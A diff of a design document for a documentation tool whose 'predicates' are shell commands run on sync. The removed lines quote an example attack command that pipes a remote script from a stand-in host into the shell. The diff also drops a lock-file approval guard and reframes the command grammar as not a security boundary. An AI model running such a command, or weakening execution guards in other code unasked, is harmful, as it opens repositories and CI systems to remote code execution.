@@ -229,11 +229,11 @@ The mirror of a check that can never fail is one that can never pass. Both read 
 
 A **generated** prohibition without a predicate is not admissible. Context alone is the weak enforcement path; the predicate is what backs it up. Human-authored Rules are exempt — a team may assert something no command can check ("admin UX changes are validated with a content editor"), and refusing to record it would be worse than leaving it unverified.
 
-### Predicates are executed code — treat them as such
+### Predicate grammar
 
-A predicate is a shell command living in a checked-in markdown file that `sync` runs. That makes a docs change an execution path: a pull request adding an invariant with `cmd="curl evil.sh | sh"` runs the next time anyone syncs, and repokit is meant to run in CI. Two guards, both required.
+A predicate has to survive being re-run, unattended, on a machine that isn't the one that wrote it. That rules out most of the shell. The grammar below is what's left — enforced on every predicate, generated or hand-written.
 
-**1. Grammar allowlist — enforced on every predicate, generated or hand-written.**
+**This is a generation constraint, not a security boundary.** The agent runtime already gates command execution; dockit keeps no allowlist of its own and writes no approval file. What the grammar buys is a predicate that means the same thing on every machine, every sync, and can be read at a glance in a docs diff.
 
 A predicate is admissible only if it satisfies all of:
 
@@ -250,27 +250,9 @@ A predicate is admissible only if it satisfies all of:
 
 Pipes (`|`) between stages are permitted — that's how counts get built — but every stage must independently pass. `xargs` is excluded specifically because it launches a command the grammar can't see; rewrite as a single `rg` invocation instead.
 
-**A predicate that fails the grammar is never run, and there is no override.** Flag it and leave the rule unverified. That's deliberate: an override prompt puts the decision in front of the same person who'd approve the malicious PR. If a rule genuinely needs a richer check than the grammar allows, it doesn't get an automatic predicate — record it and verify it by hand.
+**A predicate that fails the grammar is never run.** Flag it and leave the rule unverified. If a rule genuinely needs a richer check than the grammar allows, it doesn't get an automatic predicate — record it and verify it by hand.
 
-**2. Approve on first sight.**
-
-Approved predicates are recorded in `.dockit/predicates.lock`, one line per entry:
-
-```
-<sha256-of-cmd-string>  docs/PRINCIPLES.md  Import from app/core/ rather than the underlying library
-```
-
-On every sync:
-
-| State | Action |
-|---|---|
-| Hash present in the lock file | Run it |
-| Hash absent or changed | Show the exact command and what it's attached to; run only if the user approves, then record the hash |
-| Fails the grammar | Refuse, flag, never record — regardless of the lock file |
-
-Grammar first, always. A hash in the lock file does not license a command the grammar rejects; that ordering is what stops an attacker from shipping a poisoned lock entry alongside a poisoned predicate.
-
-Commit `.dockit/predicates.lock` — reviewing a change to it is reviewing which commands the repo will execute, which is exactly the diff a reviewer should see.
+**Where a predicate comes from matters.** A predicate arrives in the docs the same way any other line does: someone wrote it, or dockit generated it, and it went through review. Read it in the diff like you'd read any other checked-in command. Dockit doesn't track which ones you've seen before — the docs are the record.
 
 ---
 
